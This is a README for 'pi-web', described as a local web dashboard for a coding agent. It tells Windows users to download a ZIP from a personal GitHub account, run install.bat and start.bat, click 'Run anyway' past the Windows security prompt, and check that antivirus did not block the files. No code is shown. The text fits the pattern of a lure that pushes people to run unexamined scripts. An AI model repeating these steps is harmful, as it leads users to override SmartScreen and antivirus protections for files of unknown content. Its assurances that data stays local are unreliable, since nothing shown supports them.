# 🌐 pi-web - Manage your coding agent with ease

[![Download pi-web](https://img.shields.io/badge/Download-pi--web-blue.svg)](https://github.com/Theanie7380/pi-web)

This software provides a visual interface for the pi coding agent. It allows you to interact with code tasks through your web browser. You do not need to use a command prompt or terminal. This tool manages the background processes of the agent.

## 🛠️ System Requirements

Before you install this software, ensure your computer meets these basic needs:

*   Operating System: Windows 10 or Windows 11.
*   Memory: At least 4 gigabytes of RAM.
*   Storage: 200 megabytes of free disk space.
*   Browser: Google Chrome, Microsoft Edge, or Mozilla Firefox.

If you have these items, your computer runs this application without issues. You do not need to install extra software for code execution. The tool handles necessary components during the setup phase.

## 📥 Getting Started

Follow these steps to set up the application on your Windows machine.

1.  Visit this page to download: [https://github.com/Theanie7380/pi-web](https://github.com/Theanie7380/pi-web).
2.  Locate the green button labeled "Code" on the page.
3.  Choose "Download ZIP" from the menu.
4.  Wait for the file to finish downloading to your Downloads folder.
5.  Right-click the downloaded file and select "Extract All".
6.  Choose a location for the files and click "Extract".

Once the files exist in a folder on your computer, proceed to the installation phase.

## ⚙️ Installation and Setup

The application setup requires a few simple steps. Ensure you remain in the folder you extracted during the previous phase.

1.  Open the extracted folder named "pi-web".
2.  Look for a file named "install.bat".
3.  Double-click "install.bat" to begin the setup.
4.  A black window appears. This window displays the progress of the installation. Do not close this window while it works.
5.  When the process finishes, the window closes on its own.
6.  Look for a file named "start.bat" in the same folder.
7.  Double-click "start.bat" to launch the application.

If Windows shows a security prompt regarding the file, click "More info" and then click "Run anyway". This confirms you trust the local file.

## 🖱️ Using the Interface

Once the application starts, it opens your default web browser automatically. If it does not, open your browser and type "localhost:8080" in the address bar at the top of the screen.

The dashboard displays several options:

*   Task List: Shows all current coding projects.
*   Agent Status: Indicates if the code agent is active.
*   Input Field: Allows you to type instructions for your coding tasks.

Type your request in the input field and press Enter. The agent processes the request and updates the screen with results. If the agent finishes a task, it updates the status icon to green.

## 🛡️ Data and Security

This application runs locally on your machine. Your code files and instructions do not leave your computer. You maintain control over your data at all times. 

The software stores small configuration files in the base folder. You can reset the application by deleting the "config.json" file and restarting "start.bat". This restores the original settings. Keep your folder in a safe place, such as your Documents folder, to avoid accidental deletion.

## 📖 Troubleshooting

Problems occur rarely, but follow these tips if the application fails to start:

*   Check your internet connection if the setup phase stalls.
*   Verify that your antivirus software did not block the executable files. 
*   If the browser displays a connection error, wait ten seconds and refresh the page. The application often needs a moment to initialize the server connection.
*   Do not move the files out of the main "pi-web" folder. The program needs these specific files in place to communicate.

If you encounter persistent errors, restart your computer and try running "start.bat" again. Most performance issues relate to background apps using too much memory. Closing other heavy programs helps the agent perform at its best speed.

## 💡 Best Practices

To get the most out of this tool, structure your requests clearly. The coding agent responds better to specific instructions. Instead of saying "fix this," describe the error or the desired outcome. The interface tracks your history, so you can revisit past tasks at any time.

Keep the "start.bat" window open while you use the interface. Closing the black window stops the web server and disconnects the interface. When you finish your work, close your browser tab first, then close the black window to stop the service cleanly.

Keywords: web-ui, coding-agent, windows-application, automation, developer-tools